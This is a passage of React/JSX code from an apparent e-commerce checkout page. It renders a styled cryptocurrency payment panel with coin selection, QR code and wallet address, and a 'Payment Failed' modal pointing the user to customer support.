              {/* ── Crypto Panel ── */}
              {paymentMethod === 'crypto' && (
                <div className="border border-gray-100 rounded-2xl p-6 md:p-8 bg-white shadow-sm">
                  <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-purple-500/10 to-blue-500/10 flex items-center justify-center">
                        <Coins className="w-4 h-4 text-purple-600" />
                      </div>
                      <h2 className="font-sans font-black uppercase tracking-widest text-sm">Pay with Crypto</h2>
                    </div>
                    <button onClick={fetchPrices} disabled={pricesLoading}
                      className="flex items-center gap-1.5 text-[11px] text-gray-400 hover:text-gray-600 transition-colors font-sans font-bold uppercase tracking-wider bg-gray-50 hover:bg-gray-100 rounded-full px-3 py-1.5">
                      <RefreshCw className={`w-3 h-3 ${pricesLoading ? 'animate-spin' : ''}`} />
                      {pricesLoading ? 'Updating' : 'Refresh'}
                    </button>
                  </div>

                  {/* Coin selector — premium glassmorphism cards */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6">
                    {(Object.keys(CRYPTO_WALLETS) as CryptoSymbol[]).map((sym) => {
                      const w = CRYPTO_WALLETS[sym];
                      const isActive = selectedCoin === sym;
                      const price = cryptoPrices[w.geckoId];
                      const formattedPrice = price
                        ? price >= 1000
                          ? `$${(price / 1000).toFixed(1)}k`
                          : price >= 1
                            ? `$${price.toFixed(2)}`
                            : `$${price.toFixed(4)}`
                        : '—';
                      return (
                        <button
                          key={sym}
                          onClick={() => setSelectedCoin(sym)}
                          className="group relative overflow-hidden rounded-2xl transition-all duration-300 focus:outline-none"
                          style={{
                            transform: isActive ? 'scale(1.04)' : 'scale(1)',
                            boxShadow: isActive
                              ? `0 8px 32px ${w.color}30, 0 0 0 2px ${w.color}`
                              : '0 1px 4px rgba(0,0,0,0.06)',
                          }}
                        >
                          {/* Background gradient */}
                          <div
                            className="absolute inset-0 transition-opacity duration-300"
                            style={{
                              background: isActive
                                ? `linear-gradient(160deg, ${w.color}18 0%, ${w.color}08 50%, ${w.color}15 100%)`
                                : 'linear-gradient(160deg, #fafafa 0%, #ffffff 100%)',
                              opacity: 1,
                            }}
                          />

                          {/* Animated glow ring for active */}
                          {isActive && (
                            <div
                              className="absolute inset-0 rounded-2xl"
                              style={{
                                background: `radial-gradient(circle at 50% 0%, ${w.color}20 0%, transparent 70%)`,
                                animation: 'cryptoPulse 2s ease-in-out infinite',
                              }}
                            />
                          )}

                          {/* Border overlay */}
                          <div
                            className="absolute inset-0 rounded-2xl transition-all duration-300"
                            style={{
                              border: isActive ? `2px solid ${w.color}` : '1px solid #e5e7eb',
                            }}
                          />

                          {/* Content */}
                          <div className="relative z-10 flex flex-col items-center py-5 px-3 gap-2.5">
                            {/* Coin logo with ambient glow */}
                            <div className="relative">
                              {isActive && (
                                <div
                                  className="absolute inset-0 rounded-full blur-lg opacity-40"
                                  style={{ backgroundColor: w.color, transform: 'scale(1.6)' }}
                                />
                              )}
                              <div
                                className="relative w-12 h-12 rounded-full flex items-center justify-center transition-all duration-300"
                                style={{
                                  backgroundColor: isActive ? w.color : `${w.color}12`,
                                  boxShadow: isActive ? `0 4px 14px ${w.color}40` : 'none',
                                }}
                              >
                                <img
                                  src={w.logo}
                                  alt={w.name}
                                  className="w-6 h-6 transition-all duration-300"
                                  style={{
                                    filter: isActive ? 'brightness(10)' : 'none',
                                    transform: isActive ? 'scale(1.1)' : 'scale(1)',
                                  }}
                                />
                              </div>
                            </div>

                            {/* Coin name & network */}
                            <div className="text-center">
                              <p
                                className="text-sm font-sans font-black uppercase tracking-wider transition-colors duration-200"
                                style={{ color: isActive ? w.color : '#374151' }}
                              >
                                {sym}
                              </p>
                              <p className="text-[10px] text-gray-400 font-body mt-0.5 leading-tight">
                                {w.network.split('(')[0].trim()}
                              </p>
                            </div>

                            {/* Live price tag */}
                            <div
                              className="rounded-full px-2.5 py-0.5 text-[10px] font-sans font-bold transition-all duration-300"
                              style={{
                                backgroundColor: isActive ? `${w.color}15` : '#f3f4f6',
                                color: isActive ? w.color : '#6b7280',
                              }}
                            >
                              {pricesLoading ? (
                                <span className="inline-block w-8 h-3 bg-gray-200 rounded animate-pulse" />
                              ) : (
                                formattedPrice
                              )}
                            </div>
                          </div>

                          {/* Active check badge */}
                          {isActive && (
                            <div
                              className="absolute -top-0.5 -right-0.5 w-5 h-5 rounded-full border-[2.5px] border-white flex items-center justify-center shadow-md"
                              style={{
                                backgroundColor: w.color,
                                boxShadow: `0 2px 8px ${w.color}50`,
                              }}
                            >
                              <svg className="w-2.5 h-2.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                              </svg>
                            </div>
                          )}

                          {/* Hover shimmer effect */}
                          <div
                            className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none"
                            style={{
                              background: `linear-gradient(105deg, transparent 40%, ${w.color}08 50%, transparent 60%)`,
                            }}
                          />
                        </button>
                      );
                    })}
                  </div>

                  {/* Amount to send — premium gradient card */}
                  <div
                    className="relative overflow-hidden rounded-xl p-5 mb-6"
                    style={{
                      background: `linear-gradient(135deg, ${currentWallet.color}12 0%, ${currentWallet.color}06 40%, #fafafa 100%)`,
                      border: `1px solid ${currentWallet.color}25`,
                    }}
                  >
                    {/* Decorative circle */}
                    <div
                      className="absolute -right-6 -top-6 w-28 h-28 rounded-full opacity-[0.07]"
                      style={{ backgroundColor: currentWallet.color }}
                    />
                    <div className="relative z-10 flex items-center justify-between">
                      <div>
                        <p className="text-[11px] text-gray-500 font-body uppercase tracking-wider font-medium">Send exactly</p>
                        <div className="flex items-baseline gap-2 mt-1">
                          <p className="font-sans font-black text-3xl tracking-tight" style={{ color: currentWallet.color }}>
                            {pricesLoading ? (
                              <span className="inline-block w-32 h-8 bg-gray-200 rounded animate-pulse" />
                            ) : (
                              getCryptoAmount(selectedCoin)
                            )}
                          </p>
                          <span className="font-sans font-black text-lg text-gray-400">{selectedCoin}</span>
                        </div>
                        <p className="text-xs text-gray-400 font-body mt-1 flex items-center gap-1.5">
                          <span className="inline-block w-1.5 h-1.5 rounded-full" style={{ backgroundColor: currentWallet.color }} />
                          ≈ {formatPrice(grandTotal)} USD
                        </p>
                      </div>
                      <div className="text-right">
                        <div
                          className="w-14 h-14 rounded-2xl flex items-center justify-center mb-2 mx-auto"
                          style={{
                            backgroundColor: `${currentWallet.color}15`,
                            boxShadow: `0 4px 12px ${currentWallet.color}15`,
                          }}
                        >
                          <img src={currentWallet.logo} alt={currentWallet.name} className="w-7 h-7" />
                        </div>
                        <p className="text-[10px] text-gray-400 font-body">Network</p>
                        <p className="text-xs font-sans font-bold text-gray-700">{currentWallet.network}</p>
                      </div>
                    </div>
                  </div>

                  {/* QR code — premium container */}
                  <div className="flex flex-col items-center mb-6">
                    <p className="text-xs font-sans font-bold uppercase tracking-wider text-gray-400 mb-4">
                      Scan with your wallet app
                    </p>
                    <div
                      className="relative p-3 rounded-2xl"
                      style={{
                        background: `linear-gradient(135deg, ${currentWallet.color}10, transparent, ${currentWallet.color}08)`,
                        boxShadow: `0 4px 24px ${currentWallet.color}12`,
                      }}
                    >
                      <div className="bg-white rounded-xl p-2 shadow-sm">
                        <QRCode value={currentWallet.address} size={200} />
                      </div>
                      {/* Corner accents */}
                      <div className="absolute top-0 left-0 w-4 h-4 border-t-2 border-l-2 rounded-tl-2xl" style={{ borderColor: currentWallet.color }} />
                      <div className="absolute top-0 right-0 w-4 h-4 border-t-2 border-r-2 rounded-tr-2xl" style={{ borderColor: currentWallet.color }} />
                      <div className="absolute bottom-0 left-0 w-4 h-4 border-b-2 border-l-2 rounded-bl-2xl" style={{ borderColor: currentWallet.color }} />
                      <div className="absolute bottom-0 right-0 w-4 h-4 border-b-2 border-r-2 rounded-br-2xl" style={{ borderColor: currentWallet.color }} />
                    </div>
                    <div className="flex items-center gap-2 mt-4">
                      <div className="h-px w-8 bg-gray-200" />
                      <p className="text-[10px] text-gray-400 font-sans font-bold uppercase tracking-widest">or paste address</p>
                      <div className="h-px w-8 bg-gray-200" />
                    </div>
                  </div>

                  {/* Wallet address — enhanced */}
                  <div
                    className="rounded-xl border p-4 mb-2"
                    style={{ borderColor: `${currentWallet.color}30` }}
                  >
                    <div className="flex items-center gap-2 mb-2.5">
                      <div
                        className="w-5 h-5 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: `${currentWallet.color}15` }}
                      >
                        <img src={currentWallet.logo} alt="" className="w-3 h-3" />
                      </div>
                      <p className="text-[11px] text-gray-500 font-sans font-bold uppercase tracking-wider">
                        {currentWallet.name} Address
                      </p>
                      <span className="text-[9px] font-sans font-bold uppercase tracking-wider px-1.5 py-0.5 rounded-full" style={{ backgroundColor: `${currentWallet.color}12`, color: currentWallet.color }}>
                        {currentWallet.network}
                      </span>
                    </div>
                    <div className="flex items-center justify-between gap-3 bg-gray-50 rounded-lg p-3">
                      <p className="font-mono text-[11px] text-gray-700 break-all leading-relaxed select-all">{currentWallet.address}</p>
                      <div className="flex-shrink-0">
                        <CopyButton text={currentWallet.address} />
                      </div>
                    </div>
                  </div>

                  {/* Warning — refined */}
                  <div className="bg-amber-50/70 border border-amber-200/60 rounded-xl p-3.5 mb-6 flex gap-2.5">
                    <div className="w-7 h-7 rounded-full bg-amber-100 flex items-center justify-center flex-shrink-0">
                      <AlertTriangle className="w-3.5 h-3.5 text-amber-600" />
                    </div>
                    <p className="text-xs text-amber-800 font-body leading-relaxed">
                      <strong>Send only {selectedCoin} on the {currentWallet.network}.</strong> Sending other assets or using the wrong network will result in permanent loss.
                    </p>
                  </div>

                  {/* Instructions — visual steps */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
                    {[
                      { step: '1', text: 'Open your crypto wallet app' },
                      { step: '2', text: `Scan the QR or paste the ${selectedCoin} address` },
                      { step: '3', text: `Send exactly ${pricesLoading ? '...' : getCryptoAmount(selectedCoin)} ${selectedCoin}` },
                      { step: '4', text: 'Click "I\'ve Paid" to confirm your order' },
                    ].map(({ step, text }) => (
                      <div key={step} className="flex items-start gap-3 bg-gray-50/80 rounded-xl p-3">
                        <div
                          className="w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 text-[10px] font-sans font-black text-white"
                          style={{ backgroundColor: currentWallet.color }}
                        >
                          {step}
                        </div>
                        <p className="text-xs text-gray-600 font-body leading-relaxed pt-0.5">{text}</p>
                      </div>
                    ))}
                  </div>

                  <div className="flex flex-col gap-3">
                    <button onClick={handleCryptoPaid} disabled={loading}
                      className={`w-full flex items-center justify-center gap-2.5 py-3.5 px-6 font-sans font-black uppercase tracking-wider text-sm text-white rounded-xl transition-all duration-300 ${
                        loading ? 'opacity-70 cursor-not-allowed' : 'hover:brightness-110 hover:shadow-lg'
                      }`}
                      style={{
                        backgroundColor: currentWallet.color,
                        boxShadow: `0 4px 20px ${currentWallet.color}35`,
                      }}
                    >
                      {loading
                        ? <><div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Confirming...</>
                        : <><CheckCircle className="w-4 h-4" /> I&apos;ve Paid — {getCryptoAmount(selectedCoin)} {selectedCoin}</>
                      }
                    </button>
                    <button onClick={() => setStep('shipping')} className="flex items-center justify-center gap-1.5 text-sm font-body text-gray-400 hover:text-gray-700 transition-colors py-2">
                      <ArrowLeft className="w-4 h-4" /> Back to Shipping
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Sidebar */}
        <div className="lg:col-span-1"><OrderSummary /></div>
      </div>

      {/* ── Payment Error Popup ── */}
      {showPaymentError && (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-4" style={{ backgroundColor: 'rgba(0,0,0,0.6)' }}>
          <div className="bg-white w-full max-w-md relative animate-fade-in" style={{ animation: 'fadeIn 0.3s ease-out' }}>
            {/* Close button */}
            <button
              onClick={() => setShowPaymentError(false)}
              className="absolute top-4 right-4 text-tm-gray-mid hover:text-tm-black transition-colors"
            >
              <X className="w-5 h-5" />
            </button>

            {/* Error icon */}
            <div className="pt-8 pb-4 flex justify-center">
              <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
                <XCircle className="w-8 h-8 text-tm-red" />
              </div>
            </div>

            {/* Title */}
            <div className="px-6 text-center">
              <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-2">
                Payment Failed
              </h2>
              <p className="text-sm font-body text-tm-gray-mid leading-relaxed">
                We were unable to process your payment. This could be due to insufficient funds,
                incorrect card details, or a temporary issue with your bank.
              </p>
            </div>

            {/* Error details box */}
            <div className="mx-6 mt-4 bg-red-50 border border-red-200 p-4">
              <div className="flex gap-2">
                <AlertTriangle className="w-4 h-4 text-red-600 flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-xs font-bold text-red-800">Transaction Declined</p>
                  <p className="text-xs text-red-700 font-body mt-0.5">
                    Your card ending in ****{paymentForm.cardNumber.replace(/\s/g, '').slice(-4)} was declined.
                    Reach out to our support team for assistance.
                  </p>
                </div>
              </div>
            </div>

            {/* Order summary in popup */}
            <div className="mx-6 mt-4 border border-tm-border p-3">
              <div className="flex justify-between text-xs font-body">
                <span className="text-tm-gray-mid">Order Total</span>
                <span className="font-bold">{formatPrice(grandTotal)}</span>
              </div>
              <div className="flex justify-between text-xs font-body mt-1">
                <span className="text-tm-gray-mid">Items</span>
                <span>{items.length} item{items.length !== 1 ? 's' : ''}</span>
              </div>
            </div>

            {/* CTA Buttons */}
            <div className="px-6 pt-5 pb-6 space-y-3">
              <Link
                href="/support"
                className="btn-primary flex items-center justify-center gap-2 w-full text-center"
              >
                <Headphones className="w-4 h-4" />
                Contact Customer Support
              </Link>
              <button
                onClick={() => setShowPaymentError(false)}
                className="btn-secondary w-full text-center"
              >
                Try Again
              </button>
            </div>

            {/* Footer */}
            <div className="border-t border-tm-border px-6 py-3 bg-tm-gray">
              <p className="text-[10.5px] text-tm-gray-mid font-body text-center">
                If the issue persists, please contact our support team for immediate assistance.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
